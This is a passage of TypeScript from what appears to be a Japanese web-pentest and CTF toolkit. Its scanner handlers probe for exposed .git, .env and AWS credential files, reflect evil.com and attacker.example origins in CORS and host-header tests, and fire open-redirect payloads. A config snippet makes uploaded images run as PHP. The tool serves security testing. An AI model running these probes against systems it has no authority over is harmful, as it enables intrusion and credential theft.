      ["X-Forwarded-For", { "X-Forwarded-For": evil }],
      ["X-Original-URL", { "X-Original-URL": "/admin" }],
      ["X-Rewrite-URL", { "X-Rewrite-URL": "/admin" }],
      ["X-Host", { "X-Host": evil }],
      ["X-Forwarded-Server", { "X-Forwarded-Server": evil }],
      ["Forwarded", { Forwarded: `host=${evil}` }],
      ["X-HTTP-Method-Override (PUT)", { "X-HTTP-Method-Override": "PUT" }],
      [
        "Host duplication (X-Forwarded-Host + Host)",
        { "X-Forwarded-Host": evil },
      ],
    ];
    const lines: string[] = [];
    // ベースライン
    let baseLen = 0;
    let baseStatus = 0;
    try {
      const r = await fetch(url);
      baseStatus = r.status;
      baseLen = (await r.text()).length;
      lines.push(`baseline: ${baseStatus} / ${baseLen} bytes`);
    } catch {
      /* noop */
    }
    for (const [name, h] of headers) {
      try {
        const r = await fetch(url, { headers: h });
        const t = await r.text();
        const reflected = t.includes(evil);
        const flag = reflected
          ? "🚨"
          : Math.abs(t.length - baseLen) > 50
            ? "⚠️"
            : "✅";
        lines.push(
          `${flag} ${name.padEnd(40)} ${r.status} / ${t.length}b${reflected ? " (反射!)" : ""}`,
        );
      } catch (e) {
        lines.push(`❌ ${name} → ${String(e).slice(0, 60)}`);
      }
    }
    lines.push(
      `\n判定: 🚨=ヘッダ値が応答に反射 (Cache poisoning / SSRF) / ⚠️=応答長変化 / ✅=変化なし`,
    );
    out.textContent = lines.join("\n");
  });
}

// ===== 🧭 .git / .svn 露出チェック =====
function setupGitExposureSub(): void {
  const u = document.getElementById("gex-url") as HTMLInputElement | null;
  const btn = document.getElementById("gex-run") as HTMLButtonElement | null;
  const out = document.getElementById("gex-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    let base = (u?.value || "").trim().replace(/\/+$/, "");
    if (!base) return;
    out.textContent = "スキャン中...";

    // ---- ソフト 404 検出 (キャッチオール SPA 対策) ----
    const baselineSizes = new Set<number>();
    try {
      const probes = [
        `__yuzu_probe_${Math.random().toString(36).slice(2, 10)}`,
        `__yuzu_probe_${Math.random().toString(36).slice(2, 10)}_x`,
      ];
      const probeSizes: number[] = [];
      for (const probe of probes) {
        try {
          const pr = await fetch(`${base}/${probe}`);
          if (pr.ok) {
            const ptxt = await pr.text();
            probeSizes.push(ptxt.length);
          }
        } catch {
          /* ignore */
        }
      }
      if (probeSizes.length === 2 && probeSizes[0] === probeSizes[1]) {
        baselineSizes.add(probeSizes[0]);
      }
    } catch {
      /* ignore */
    }
    // ----

    const targets = [
      "/.git/HEAD",
      "/.git/config",
      "/.git/index",
      "/.git/logs/HEAD",
      "/.git/refs/heads/master",
      "/.git/refs/heads/main",
      "/.svn/entries",
      "/.svn/wc.db",
      "/.hg/store/00manifest.i",
      "/.bzr/branch/branch.conf",
      "/.DS_Store",
      "/.idea/workspace.xml",
      "/.vscode/settings.json",
      "/.env",
      "/.env.local",
      "/.env.production",
      "/.npmrc",
      "/.aws/credentials",
      "/composer.json",
      "/composer.lock",
      "/package.json",
      "/package-lock.json",
      "/yarn.lock",
      "/Gemfile",
      "/Gemfile.lock",
      "/wp-config.php.bak",
      "/wp-config.php~",
      "/web.config",
      "/.htaccess",
      "/backup.zip",
      "/backup.tar.gz",
      "/site.zip",
      "/db.sql",
      "/dump.sql",
    ];
    const lines: string[] = [];
    if (baselineSizes.size > 0) {
      const bs = [...baselineSizes][0];
      lines.push(
        `[INFO] ソフト 404 検出: 存在しないパスでも 200 (${bs}b) を返します。同サイズの 200 は除外。\n`,
      );
    }
    for (const p of targets) {
      try {
        const r = await fetch(base + p);
        if (r.ok) {
          const ct = r.headers.get("content-type") || "";
          const txt = await r.text();
          // ソフト 404 と同サイズなら除外
          if (baselineSizes.has(txt.length)) {
            continue;
          }
          const looksReal =
            !/<html|<!DOCTYPE/i.test(txt.slice(0, 200)) ||
            /\.(zip|gz|sql|json|conf|ini)$/i.test(p);
          const flag = looksReal ? "🚨" : "⚠️";
          lines.push(
            `${flag} ${p.padEnd(40)} ${r.status} ${ct.slice(0, 30)} (${txt.length}b)${looksReal ? "" : " [HTMLぽい→誤検知?]"}`,
          );
        } else if (r.status === 403) {
          lines.push(`🔒 ${p.padEnd(40)} 403 (存在の可能性)`);
        }
      } catch {
        /* noop */
      }
    }
    if (lines.filter((l) => !l.startsWith("[INFO]")).length === 0)
      lines.push("⭕ 既知の露出ファイルは検出されませんでした");
    else lines.push(`\n→ git 露出があれば: git-dumper ${base}/.git/ /tmp/repo`);
    out.textContent = lines.join("\n");
  });
}

// ===== 📦 SourceMap 検出 =====
function setupSourceMapSub(): void {
  const u = document.getElementById("sm-url") as HTMLInputElement | null;
  const btn = document.getElementById("sm-run") as HTMLButtonElement | null;
  const out = document.getElementById("sm-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (u?.value || "").trim();
    if (!url) return;
    out.textContent = "解析中...";
    try {
      const r = await fetch(url);
      const txt = await r.text();
      const m = /\/[/*]#\s*sourceMappingURL=([^\s*]+)/i.exec(txt.slice(-2000));
      if (!m) {
        // ヘッダにあるかもしれない
        const sm = r.headers.get("sourcemap") || r.headers.get("x-sourcemap");
        if (sm) {
          out.textContent = `Header: SourceMap → ${sm}`;
          return;
        }
        // 推測 .map
        const guess = url.replace(/(\?|$)/, ".map$1");
        const r2 = await fetch(guess);
        if (r2.ok) {
          const body = await r2.text();
          // SPA のキャッチオールは HTML が返るので、本物の sourcemap か検証
          const trimmed = body.trim();
          const looksLikeMap =
            trimmed.startsWith("{") &&
            /["']version["']\s*:\s*3/.test(trimmed.slice(0, 200));
          if (!looksLikeMap) {
            out.textContent = `⚠️ ${guess} は 200 を返しましたが内容が source map ではありません (キャッチオール 404 の可能性)`;
            return;
          }
          out.textContent = `🚨 推測ヒット: ${guess}\n${body.slice(0, 4000)}…`;
          return;
        }
        out.textContent = "sourceMappingURL なし & .map 推測も 404";
        return;
      }
      const smRef = m[1];
      const smUrl =
        smRef.startsWith("data:") || smRef.startsWith("http")
          ? smRef
          : new URL(smRef, url).toString();
      if (smUrl.startsWith("data:")) {
        out.textContent = `インライン data URI source map\n${smUrl.slice(0, 4000)}…`;
        return;
      }
      const r3 = await fetch(smUrl);
      if (!r3.ok) {
        out.textContent = `参照あり: ${smUrl}\n→ ${r3.status}`;
        return;
      }
      const data = (await r3.json()) as {
        sources?: string[];
        sourceRoot?: string;
        names?: string[];
        sourcesContent?: (string | null)[];
      };
      const lines = [
        `🚨 source map 公開中: ${smUrl}`,
        `sources : ${(data.sources || []).length} 件`,
        `names   : ${(data.names || []).length} 件`,
        `content 同梱: ${(data.sourcesContent || []).filter(Boolean).length} ファイル (= 元ソース復元可)`,
        ``,
        `--- sources (上位 50) ---`,
        ...(data.sources || []).slice(0, 50).map((s) => `  ${s}`),
      ];
      out.textContent = lines.join("\n");
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 🦴 Magic Bytes =====
const MAGIC_BYTES: { sig: number[]; name: string; offset?: number }[] = [
  { sig: [0x89, 0x50, 0x4e, 0x47], name: "PNG image" },
  { sig: [0xff, 0xd8, 0xff], name: "JPEG image" },
  { sig: [0x47, 0x49, 0x46, 0x38], name: "GIF image" },
  { sig: [0x42, 0x4d], name: "BMP image" },
  { sig: [0x52, 0x49, 0x46, 0x46], name: "RIFF (WAV/AVI/WebP)" },
  { sig: [0x25, 0x50, 0x44, 0x46], name: "PDF" },
  { sig: [0x50, 0x4b, 0x03, 0x04], name: "ZIP / JAR / DOCX / APK / WAR" },
  { sig: [0x50, 0x4b, 0x05, 0x06], name: "ZIP (empty)" },
  { sig: [0x1f, 0x8b], name: "GZIP" },
  { sig: [0x42, 0x5a, 0x68], name: "BZIP2" },
  { sig: [0xfd, 0x37, 0x7a, 0x58, 0x5a], name: "XZ" },
  { sig: [0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c], name: "7-Zip" },
  { sig: [0x52, 0x61, 0x72, 0x21], name: "RAR" },
  { sig: [0x4d, 0x5a], name: "PE / EXE / DLL (Windows)" },
  { sig: [0x7f, 0x45, 0x4c, 0x46], name: "ELF (Linux/Unix executable)" },
  { sig: [0xca, 0xfe, 0xba, 0xbe], name: "Mach-O fat / Java class" },
  { sig: [0xfe, 0xed, 0xfa, 0xce], name: "Mach-O 32-bit" },
  { sig: [0xfe, 0xed, 0xfa, 0xcf], name: "Mach-O 64-bit" },
  { sig: [0x23, 0x21], name: "Shebang (#!) script" },
  { sig: [0x3c, 0x3f, 0x70, 0x68, 0x70], name: "PHP source" },
  { sig: [0x3c, 0x21, 0x44, 0x4f, 0x43, 0x54, 0x59, 0x50, 0x45], name: "HTML" },
  { sig: [0x3c, 0x68, 0x74, 0x6d, 0x6c], name: "HTML" },
  { sig: [0x3c, 0x3f, 0x78, 0x6d, 0x6c], name: "XML" },
  { sig: [0x7b, 0x5c, 0x72, 0x74, 0x66], name: "RTF" },
  { sig: [0xd0, 0xcf, 0x11, 0xe0], name: "MS Office (legacy DOC/XLS/PPT)" },
  { sig: [0x49, 0x44, 0x33], name: "MP3 (ID3)" },
  {
    sig: [0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70],
    name: "MP4",
    offset: 0,
  },
  { sig: [0x4f, 0x67, 0x67, 0x53], name: "OGG" },
  { sig: [0x66, 0x4c, 0x61, 0x43], name: "FLAC" },
  {
    sig: [
      0x53, 0x51, 0x4c, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6f, 0x72, 0x6d, 0x61,
      0x74, 0x20, 0x33,
    ],
    name: "SQLite 3 DB",
  },
  { sig: [0x53, 0x53, 0x48, 0x2d], name: "SSH key (OpenSSH banner)" },
  {
    sig: [0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e],
    name: "PEM (-----BEGIN)",
  },
  { sig: [0x30, 0x82], name: "DER (ASN.1) — 証明書/鍵" },
];
function setupMagicBytesSub(): void {
  const f = document.getElementById("mb-file") as HTMLInputElement | null;
  const hex = document.getElementById("mb-hex") as HTMLTextAreaElement | null;
  const btn = document.getElementById("mb-run") as HTMLButtonElement | null;
  const out = document.getElementById("mb-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  const identify = (bytes: Uint8Array): string => {
    const hits = MAGIC_BYTES.filter((m) =>
      m.sig.every((b, i) => bytes[i] === b),
    );
    const head = Array.from(bytes.slice(0, 16))
      .map((b) => b.toString(16).padStart(2, "0"))
      .join(" ");
    if (hits.length === 0)
      return `先頭 16byte: ${head}\n判定: 該当する Magic Bytes なし`;
    return `先頭 16byte: ${head}\n判定: ${hits.map((h) => h.name).join(", ")}`;
  };
  btn.addEventListener("click", async () => {
    const file = f?.files?.[0];
    if (file) {
      const buf = await file.slice(0, 32).arrayBuffer();
      out.textContent = `ファイル: ${file.name} (${file.size} bytes)\n${identify(new Uint8Array(buf))}`;
      return;
    }
    const txt = (hex?.value || "").trim();
    if (!txt) {
      out.textContent = "ファイルまたは hex を指定";
      return;
    }
    const clean = txt.replace(/[^0-9a-f]/gi, "");
    const bytes = new Uint8Array(clean.length / 2);
    for (let i = 0; i < bytes.length; i++)
      bytes[i] = parseInt(clean.substr(i * 2, 2), 16);
    out.textContent = identify(bytes);
  });
}

// ===== 🚩 Flag / Token 抽出 =====
function setupFlagExtractSub(): void {
  const inEl = document.getElementById(
    "fl-input",
  ) as HTMLTextAreaElement | null;
  const pre = document.getElementById("fl-prefix") as HTMLInputElement | null;
  const btn = document.getElementById("fl-run") as HTMLButtonElement | null;
  const out = document.getElementById("fl-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const txt = inEl?.value || "";
    const prefixes = (pre?.value || "flag")
      .split(/[,\s]+/)
      .map((s) => s.trim())
      .filter(Boolean);
    const found: string[] = [];
    for (const p of prefixes) {
      const re = new RegExp(`${p}\\{[^}\\n]{1,200}\\}`, "gi");
      const m = txt.match(re);
      if (m) for (const x of m) found.push(`[${p}] ${x}`);
    }
    // ハッシュ・トークン系
    const hashRe = /\b[a-f0-9]{32,128}\b/gi;
    const hashes = txt.match(hashRe);
    if (hashes)
      for (const h of new Set(hashes)) found.push(`[hash ${h.length}] ${h}`);
    const jwtRe =
      /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g;
    const jwts = txt.match(jwtRe);
    if (jwts) for (const j of new Set(jwts)) found.push(`[JWT] ${j}`);
    const b64Re = /\b[A-Za-z0-9+/]{40,}={0,2}\b/g;
    const b64 = txt.match(b64Re);
    if (b64)
      for (const b of new Set(b64).values())
        found.push(`[base64] ${b.slice(0, 80)}${b.length > 80 ? "…" : ""}`);
    out.textContent = found.length === 0 ? "(検出なし)" : found.join("\n");
  });
}

// ===== 🌀 Response Diff =====
function setupRespDiffSub(): void {
  const a = document.getElementById("rdiff-a") as HTMLInputElement | null;
  const b = document.getElementById("rdiff-b") as HTMLInputElement | null;
  const btn = document.getElementById("rdiff-run") as HTMLButtonElement | null;
  const out = document.getElementById("rdiff-out") as HTMLPreElement | null;
  if (!btn || !out) return;

  type HttpReqResult = {
    status: number;
    body: string;
    bytes: number;
    time_ms: number;
  };

  const httpGet = (url: string): Promise<HttpReqResult> =>
    invoke<HttpReqResult>("pentest_http_request", {
      method: "GET",
      url,
      headers: [],
      body: null,
      timeoutMs: 15000,
      followRedirects: true,
    });

  btn.addEventListener("click", async () => {
    const ua = (a?.value || "").trim();
    const ub = (b?.value || "").trim();
    if (!ua || !ub) {
      out.textContent = "URL A / URL B を両方指定";
      return;
    }
    out.textContent = "取得中...";
    try {
      const ra = await httpGet(ua);
      const rb = await httpGet(ub);
      const ta = ra.body;
      const tb = rb.body;
      const lines = [
        `URL A: ${ra.status} / ${ra.bytes} bytes / ${ra.time_ms} ms`,
        `URL B: ${rb.status} / ${rb.bytes} bytes / ${rb.time_ms} ms`,
        ``,
        `Status 一致: ${ra.status === rb.status ? "✅" : "🚨 異なる"}`,
        `Length 差  : ${rb.bytes - ra.bytes} bytes${Math.abs(rb.bytes - ra.bytes) > 30 ? " 🚨" : ""}`,
        `時間差     : ${rb.time_ms - ra.time_ms} ms${Math.abs(rb.time_ms - ra.time_ms) > 1000 ? " 🚨 (Time-based blind の兆候)" : ""}`,
      ];
      let common = 0;
      const max = Math.min(ta.length, tb.length);
      while (common < max && ta[common] === tb[common]) common++;
      lines.push(`共通 prefix : ${common} bytes`);
      if (common < max) {
        const segA = ta.slice(common, common + 200).replace(/\n/g, "\\n");
        const segB = tb.slice(common, common + 200).replace(/\n/g, "\\n");
        lines.push(``, `--- 最初の差分位置 (offset ${common}) ---`);
        lines.push(`A: ${segA}`);
        lines.push(`B: ${segB}`);
      }
      out.textContent = lines.join("\n");
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 📑 設定スニペット =====
const CONFIG_SNIPPETS: Record<string, string> = {
  "ht-upload": `# .htaccess: アップロード経由 PHP 実行 (PoC) — 検証目的のみ\nAddType application/x-httpd-php .jpg .png .gif\n# または\n<FilesMatch "\\.(jpg|png|gif)$">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n# Apache が AllowOverride FileInfo を許可している必要あり`,
  "ht-deny": `# .htaccess: 機微ファイルを 403 拒否\n<FilesMatch "(\\.git|\\.env|\\.bak|\\.sql|composer\\.(json|lock))$">\n    Require all denied\n</FilesMatch>\n# 古い Apache 2.2:\n<Files "*.bak">\n    Order allow,deny\n    Deny from all\n</Files>`,
  "ht-rewrite": `# .htaccess: クリーン URL リライト\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?path=$1 [QSA,L]`,
  "wc-handler": `<!-- web.config: .aspx ハンドラ追加 (IIS) -->\n<configuration>\n  <system.webServer>\n    <handlers>\n      <add name="aspx-handler" path="*.aspx" verb="*"\n           type="System.Web.UI.PageHandlerFactory"\n           preCondition="integratedMode" />\n    </handlers>\n    <directoryBrowse enabled="true" />\n  </system.webServer>\n</configuration>`,
  "wc-deny": `<!-- web.config: 拡張子拒否 -->\n<configuration>\n  <system.webServer>\n    <security>\n      <requestFiltering>\n        <fileExtensions>\n          <add fileExtension=".bak" allowed="false" />\n          <add fileExtension=".old" allowed="false" />\n          <add fileExtension=".sql" allowed="false" />\n          <add fileExtension=".env" allowed="false" />\n        </fileExtensions>\n        <hiddenSegments>\n          <add segment=".git" />\n          <add segment=".svn" />\n        </hiddenSegments>\n      </requestFiltering>\n    </security>\n  </system.webServer>\n</configuration>`,
  "ng-proxy": `# nginx: SSRF 検証用 (内部リソース proxy)\nlocation /proxy {\n    # 危険: ユーザ入力をそのまま proxy_pass しない\n    set $target $arg_url;\n    proxy_pass $target;        # ← SSRF\n    proxy_set_header Host $proxy_host;\n}\n# 安全側: ホワイトリスト\nlocation /safe {\n    if ($arg_url !~ "^https://api\\.example\\.com/") {\n        return 403;\n    }\n    proxy_pass $arg_url;\n}`,
  "ng-alias": `# nginx: alias traversal pitfall\nlocation /static {\n    alias /var/www/static/;     # ← 末尾 / 無し + alias で\n}                                # /static../etc/passwd → /var/www/static../etc/passwd\n# 修正:\nlocation /static/ {              # ← 末尾 / を必ず付ける\n    alias /var/www/static/;\n}\n# または root を使う\nlocation /static {\n    root /var/www;\n}`,
};
function setupConfigSnippetSub(): void {
  const sel = document.getElementById("cfg-type") as HTMLSelectElement | null;
  const out = document.getElementById("cfg-out") as HTMLPreElement | null;
  if (!sel || !out) return;
  const render = (): void => {
    out.textContent = CONFIG_SNIPPETS[sel.value] || "";
  };
  sel.addEventListener("change", render);
  render();
}

// ===== 🧮 CIDR / サブネット =====
function ipToInt(ip: string): number {
  const p = ip.split(".").map(Number);
  if (p.length !== 4 || p.some((n) => isNaN(n) || n < 0 || n > 255)) return NaN;
  return ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
}
function intToIp(n: number): string {
  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(
    ".",
  );
}
function setupSubnetSub(): void {
  const inEl = document.getElementById("sn-input") as HTMLInputElement | null;
  const btn = document.getElementById("sn-run") as HTMLButtonElement | null;
  const out = document.getElementById("sn-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  const run = (): void => {
    const v = (inEl?.value || "").trim();
    const m = /^([0-9.]+)\/(\d+)$/.exec(v);
    if (!m) {
      out.textContent = "形式エラー: x.x.x.x/NN を入力してください";
      return;
    }
    const ip = ipToInt(m[1]);
    const bits = parseInt(m[2], 10);
    if (isNaN(ip) || bits < 0 || bits > 32) {
      out.textContent = "IP / プレフィックスが不正です";
      return;
    }
    const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
    const wildcard = ~mask >>> 0;
    const network = (ip & mask) >>> 0;
    const broadcast = (network | wildcard) >>> 0;
    const total = bits === 32 ? 1 : bits === 31 ? 2 : Math.pow(2, 32 - bits);
    const usable = total <= 2 ? total : total - 2;
    const first = bits >= 31 ? network : (network + 1) >>> 0;
    const last = bits >= 31 ? broadcast : (broadcast - 1) >>> 0;
    const cls =
      ip < ipToInt("128.0.0.0")
        ? "A"
        : ip < ipToInt("192.0.0.0")
          ? "B"
          : ip < ipToInt("224.0.0.0")
            ? "C"
            : ip < ipToInt("240.0.0.0")
              ? "D (multicast)"
              : "E (reserved)";
    const isPrivate =
      ip >>> 24 === 10 ||
      (ip >= ipToInt("172.16.0.0") && ip <= ipToInt("172.31.255.255")) ||
      (ip >= ipToInt("192.168.0.0") && ip <= ipToInt("192.168.255.255"));
    out.textContent =
      `入力          : ${m[1]}/${bits}\n` +
      `ネットワーク  : ${intToIp(network)}\n` +
      `ブロードキャスト: ${intToIp(broadcast)}\n` +
      `サブネットマスク: ${intToIp(mask)}\n` +
      `ワイルドカード: ${intToIp(wildcard)}\n` +
      `使用可能範囲  : ${intToIp(first)} - ${intToIp(last)}\n` +
      `総 IP 数      : ${total}\n` +
      `使用可能 IP 数: ${usable}\n` +
      `クラス        : ${cls}\n` +
      `プライベート  : ${isPrivate ? "Yes" : "No"}\n`;
  };
  btn.addEventListener("click", run);
  inEl?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") run();
  });
}

// ===== 🛡️ HTTP セキュリティヘッダ =====
interface SecHeaderCheck {
  name: string;
  ok: boolean;
  value: string;
  note: string;
}
function setupSecHeadersSub(): void {
  const urlEl = document.getElementById("shdr-url") as HTMLInputElement | null;
  const btn = document.getElementById("shdr-run") as HTMLButtonElement | null;
  const out = document.getElementById("shdr-out") as HTMLDivElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (urlEl?.value || "").trim();
    if (!url) return;
    out.innerHTML = '<span style="color:#888">取得中...</span>';
    try {
      const res = await fetch(url, { method: "GET", redirect: "follow" });
      const h = res.headers;
      const checks: SecHeaderCheck[] = [];
      const get = (k: string): string => h.get(k) || "";
      checks.push({
        name: "Strict-Transport-Security",
        value: get("strict-transport-security"),
        ok: !!get("strict-transport-security"),
        note: "HSTS がない (HTTPS 強制無し)",
      });
      checks.push({
        name: "Content-Security-Policy",
        value: get("content-security-policy"),
        ok: !!get("content-security-policy"),
        note: "CSP がない (XSS 緩和無し)",
      });
      checks.push({
        name: "X-Frame-Options",
        value: get("x-frame-options"),
        ok:
          !!get("x-frame-options") ||
          /frame-ancestors/i.test(get("content-security-policy")),
        note: "クリックジャッキング対策無し",
      });
      checks.push({
        name: "X-Content-Type-Options",
        value: get("x-content-type-options"),
        ok: /nosniff/i.test(get("x-content-type-options")),
        note: "MIME スニッフィング対策無し (nosniff 推奨)",
      });
      checks.push({
        name: "Referrer-Policy",
        value: get("referrer-policy"),
        ok: !!get("referrer-policy"),
        note: "Referrer-Policy 未設定",
      });
      checks.push({
        name: "Permissions-Policy",
        value: get("permissions-policy") || get("feature-policy"),
        ok: !!(get("permissions-policy") || get("feature-policy")),
        note: "Permissions-Policy 未設定",
      });
      checks.push({
        name: "Server / X-Powered-By (情報漏洩)",
        value: [get("server"), get("x-powered-by")].filter(Boolean).join(" / "),
        ok: !get("server") && !get("x-powered-by"),
        note: "サーバ/フレームワーク情報を露出している",
      });
      checks.push({
        name: "Set-Cookie の Secure / HttpOnly",
        value: get("set-cookie"),
        ok:
          !get("set-cookie") ||
          (/secure/i.test(get("set-cookie")) &&
            /httponly/i.test(get("set-cookie"))),
        note: "Secure / HttpOnly フラグなしの Cookie あり",
      });
      const rows = checks
        .map((c) => {
          const color = c.ok ? "#1a7f37" : "#cf222e";
          const icon = c.ok ? "✅" : "⚠️";
          return `<div style="padding:6px 8px;border:1px solid #2c2c2c;border-radius:4px;margin-bottom:4px;background:#1f1f1f">
            <div style="color:${color};font-weight:600">${icon} ${escapeHtml(c.name)}</div>
            <div style="font-size:11px;color:#aaa;word-break:break-all">${c.value ? escapeHtml(c.value) : "<em>(未設定)</em>"}</div>
            ${!c.ok ? `<div style="font-size:11px;color:${color}">→ ${escapeHtml(c.note)}</div>` : ""}
          </div>`;
        })
        .join("");
      out.innerHTML = `<div style="font-size:11px;color:#888;margin-bottom:6px">Status: ${res.status} ${res.statusText} / Final URL: ${escapeHtml(res.url)}</div>${rows}`;
    } catch (e) {
      out.innerHTML = `<span style="color:#cf222e">エラー: ${escapeHtml(String(e))}</span>`;
    }
  });
}

// ===== 🚦 HTTP メソッド スキャナ =====
function setupHttpMethodsSub(): void {
  const urlEl = document.getElementById("hms-url") as HTMLInputElement | null;
  const btn = document.getElementById("hms-run") as HTMLButtonElement | null;
  const out = document.getElementById("hms-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (urlEl?.value || "").trim();
    if (!url) return;
    out.textContent = "スキャン中...";
    const methods = [
      "GET",
      "HEAD",
      "POST",
      "PUT",
      "DELETE",
      "OPTIONS",
      "PATCH",
      "TRACE",
      "CONNECT",
      "PROPFIND",
    ];
    const lines: string[] = [];
    // OPTIONS で Allow ヘッダを優先取得
    try {
      const r = await fetch(url, { method: "OPTIONS" });
      const allow =
        r.headers.get("allow") || r.headers.get("access-control-allow-methods");
      if (allow) lines.push(`OPTIONS Allow: ${allow}`);
    } catch {
      /* noop */
    }
    for (const m of methods) {
      try {
        const r = await fetch(url, { method: m, redirect: "manual" });
        const flag =
          r.status >= 200 && r.status < 400
            ? "✅"
            : r.status === 405
              ? "⛔"
              : r.status === 401 || r.status === 403
                ? "🔒"
                : "❓";
        lines.push(`${flag} ${m.padEnd(10)} ${r.status} ${r.statusText}`);
      } catch (e) {
        lines.push(`❌ ${m.padEnd(10)} エラー: ${String(e).slice(0, 60)}`);
      }
    }
    out.textContent = lines.join("\n");
  });
}

// ===== 🌐 CORS テスター =====
function setupCorsTesterSub(): void {
  const urlEl = document.getElementById("cors-url") as HTMLInputElement | null;
  const btn = document.getElementById("cors-run") as HTMLButtonElement | null;
  const out = document.getElementById("cors-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (urlEl?.value || "").trim();
    if (!url) return;
    out.textContent = "テスト中...";
    let host = "";
    try {
      host = new URL(url).host;
    } catch {
      out.textContent = "URL が不正";
      return;
    }
    const origins = [
      "https://evil.com",
      `https://${host}.evil.com`,
      `https://evil${host}`,
      "null",
      `http://${host}`,
      "https://attacker.example",
    ];
    const lines: string[] = [];
    for (const origin of origins) {
      try {
        const r = await fetch(url, {
          method: "GET",
          headers: { Origin: origin },
        });
        const acao = r.headers.get("access-control-allow-origin") || "";
        const acac = r.headers.get("access-control-allow-credentials") || "";
        const reflected = acao === origin || acao === "*";
        const dangerous =
          reflected && (acac.toLowerCase() === "true" || acao === "*");
        const flag = dangerous ? "🚨" : reflected ? "⚠️" : "✅";
        lines.push(
          `${flag} Origin: ${origin}\n   ACAO: ${acao || "(none)"} | ACAC: ${acac || "(none)"}`,
        );
      } catch (e) {
        lines.push(`❌ Origin: ${origin} → ${String(e).slice(0, 80)}`);
      }
    }
    lines.push(
      "\n判定: 🚨=ACAC:true で任意 Origin 許可 (致命的) / ⚠️=Origin 反射 / ✅=拒否",
    );
    out.textContent = lines.join("\n");
  });
}

// ===== ↪️ オープンリダイレクト テスター =====
function setupOpenRedirectSub(): void {
  const urlEl = document.getElementById("orr-url") as HTMLInputElement | null;
  const btn = document.getElementById("orr-run") as HTMLButtonElement | null;
  const out = document.getElementById("orr-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const tpl = (urlEl?.value || "").trim();
    if (!tpl.includes("FUZZ")) {
      out.textContent = "URL に FUZZ を含めてください (例: ?next=FUZZ)";
      return;
    }
    const target = "https://example.com/poc";
    const payloads = [
      target,
      `//example.com/poc`,
      `///example.com/poc`,
      `/\\/example.com/poc`,
      `https:%2f%2fexample.com/poc`,
      `https://example.com%2f@victim.com`,
      `javascript:alert(1)`,
      `data:text/html,<script>alert(1)</script>`,
      `https://victim.com.example.com`,
    ];
    out.textContent = "テスト中...";
    const lines: string[] = [];
    for (const p of payloads) {
      const u = tpl.replace("FUZZ", encodeURIComponent(p));
      try {
        const r = await fetch(u, { method: "GET", redirect: "manual" });
        const loc = r.headers.get("location") || "";
        const vuln =
          r.status >= 300 &&
          r.status < 400 &&
          /example\.com|javascript|data:/i.test(loc);
        lines.push(
          `${vuln ? "🚨" : "✅"} ${p}\n   → ${r.status} Location: ${loc || "(none)"}`,
        );
      } catch (e) {
        lines.push(`❌ ${p} → ${String(e).slice(0, 80)}`);
      }
    }
    out.textContent = lines.join("\n");
  });
}

// ===== 📝 HTML フォーム抽出 =====
function setupFormExtractorSub(): void {
  const urlEl = document.getElementById("fext-url") as HTMLInputElement | null;
  const btn = document.getElementById("fext-run") as HTMLButtonElement | null;
  const out = document.getElementById("fext-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", async () => {
    const url = (urlEl?.value || "").trim();
    if (!url) return;
    out.textContent = "取得中...";
    try {
      const r = await fetch(url);
      const html = await r.text();
      const doc = new DOMParser().parseFromString(html, "text/html");
      const forms = doc.querySelectorAll("form");
      if (forms.length === 0) {
        out.textContent = "フォームが見つかりません";
        return;
      }
      const lines: string[] = [];
      forms.forEach((f, i) => {
        const action = f.getAttribute("action") || "(同URL)";
        const method = (f.getAttribute("method") || "GET").toUpperCase();
        const enctype =
          f.getAttribute("enctype") || "application/x-www-form-urlencoded";
        lines.push(
          `=== Form #${i + 1} ===\n  action : ${action}\n  method : ${method}\n  enctype: ${enctype}`,
        );
        const inputs = f.querySelectorAll("input,textarea,select,button");
        inputs.forEach((el) => {
          const tag = el.tagName.toLowerCase();
          const name = el.getAttribute("name") || "";
          const type = el.getAttribute("type") || tag;
          const value = el.getAttribute("value") || "";
          const ph = el.getAttribute("placeholder") || "";
          if (!name && !ph) return;
          lines.push(
            `   [${type.padEnd(8)}] name="${name}" value="${value}"${ph ? ' ph="' + ph + '"' : ""}`,
          );
        });
        // CSRF トークンの可能性チェック
        const csrf = Array.from(inputs).find((el) =>
          /csrf|token|nonce|authenticity/i.test(el.getAttribute("name") || ""),
        );
        if (csrf)
          lines.push(
            `   ⚠️ CSRF トークンらしき hidden field 検出: ${csrf.getAttribute("name")}`,
          );
        lines.push("");
      });
      out.textContent = lines.join("\n");
    } catch (e) {
      out.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 🍪 Cookie 解析 =====
function setupCookieAnalyzerSub(): void {
  const inEl = document.getElementById(
    "ckie-input",
  ) as HTMLTextAreaElement | null;
  const btn = document.getElementById("ckie-run") as HTMLButtonElement | null;
